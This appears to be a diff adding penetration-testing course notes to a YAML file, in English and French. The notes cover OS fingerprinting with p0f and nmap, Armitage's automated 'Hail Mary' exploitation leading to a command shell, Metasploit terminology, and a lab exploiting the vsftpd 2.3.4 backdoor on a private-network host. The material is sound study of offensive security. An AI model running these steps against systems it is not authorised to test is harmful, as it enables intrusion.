@@ -220,9 +220,81 @@ udemy:
             # -> localhost:8834
           cmd:
       - name: 10_system_fingerprint_6
+        desc: find os data
+        p0f:
+          desc: (passive) check TCP packet, slow
+          cmd:
+            p0f -h
+            p0f -i eth0 -p -o p0f.log # several minute, listening
+        nmap:
+          desc: fast
+          cmd:
+            nmap -O 192.168.1.106
     section_5_vuln_client:
       - name: 11_come_on_14
+        armitage: ihm pour metasploit
+        install:
+          ask db/metasploit
+          default_cred:
+            msf
+            msf
+          start metasploit: yes
+          host -> add host -> 192.168.1.106
+            192.168.1.106-200
+            192.168.1.106/24
+          RMB -> scan
+          Attack -> find attacks
+          RMB -> attack -> all weakness you can try
+          Attack -> Hall Mary -> launch exploit
+          If succeed -> Command shell session
+          RMB -> Shell -> Interact
       - name: 12_metasploit_21
+        terminologie:
+          exploit: moyen par lequel un attaquand profite d un defaut dans un systeme, une app, ou un service
+          payload: code que nous voulons faire executer par le systeme et qui sera delivre par un framework
+          shellcode: suite d instructions utilisees par un payload lors de l exploitation 
+          module: part de logiciel qui peut etre utilise par le framework metasploit 
+          listener: composant qui attend une connexion entrante 
+        launch: terminal -> msfconsole
+        cmd:
+          exploits: 
+            show exploits
+            search vnc
+            metasploit.com -> exploits
+          payload:
+            show payloads
+            use <name exploit>
+            use windows/browser/honeywell_tema_exec
+            show payloads
+            show options
+          module:
+            show auxiliary
+            cd /usr/share/metasploit-framework/modules/auxiliary/scanner
+            ls
+          nasm:
+            cd /usr/share/metasploit-framework/tools
+            ./nasm.rb
+            jmp esp
+          msf:
+            msfconsole
+            msfcli
+            armitage
+            msfpayload
+            msfencode
+            nasm shell
+        lab:
+          msfconsole
+          db_nmap -sV 192.168.1.106
+          hosts
+          services
+          # attack service ftp: vsftpd 2.3.4
+          search vsftpd 2.3.4
+          # find exploit in it: exploit/unix/ftp/vsftpd_234_backdoor
+          use exploit/unix/ftp/vsftpd_234_backdoor
+          show options
+          set RHOST 192.168.1.106
+          show payloads
+          exploit  # launch exploit
       - name: 13_ vuln_browser_8
       - name: 14_backdoor_10
     section_6_vuln_web:
